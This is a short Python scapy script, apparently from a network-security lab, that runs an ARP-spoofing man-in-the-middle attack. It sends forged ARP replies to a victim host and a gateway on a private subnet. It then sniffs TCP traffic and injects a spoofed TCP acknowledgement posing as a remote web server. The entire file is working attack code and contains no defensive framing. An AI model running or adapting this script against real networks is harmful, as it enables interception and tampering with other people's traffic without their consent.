import os
import re
import time
from scapy.all import *
from uuid import getnode


def arp():
	mac = getnode()
	attacker_mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))

	stream = os.popen('arp -a')

	vip = []
	vmac = []

	lines = stream.readline()
	while lines:
		line = lines.split()
		line[1] = re.sub('[()]', '', line[1])
		vip.append(line[1])
		vmac.append(line[3])
		lines = stream.readline()

	print(vip,vmac)

	p = []
	# for i in range(len(vip)):
	p.append(Ether(dst='08:00:27:f1:c3:95', src=attacker_mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
		hwdst='08:00:27:f1:c3:95', hwsrc=attacker_mac, op=2))
	for i in range(10):
		print('send arp ', i)
		sendp(Ether(dst='08:00:27:f1:c3:95', src=attacker_mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
		hwdst='08:00:27:f1:c3:95', hwsrc=attacker_mac, op=2))
		sendp(Ether(dst='52:54:00:12:35:00', src=attacker_mac)/ARP(pdst='10.0.2.1', psrc='10.0.2.4', 
		hwdst='52:54:00:12:35:00', hwsrc=attacker_mac, op=2))
		time.sleep(0.1)

# spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
# 		sendp(spoof_vic_pkt)
# 		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
# 		sendp(spoof_ap_pkt)


def middle_man():
	s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
	s.show()
	dstport = s[0][TCP].sport
	seqq = s[0][TCP].seq
	result, un = sr(IP(src='140.113.207.246', dst='10.0.2.4')/
		TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
	result.show()


arp()
middle_man()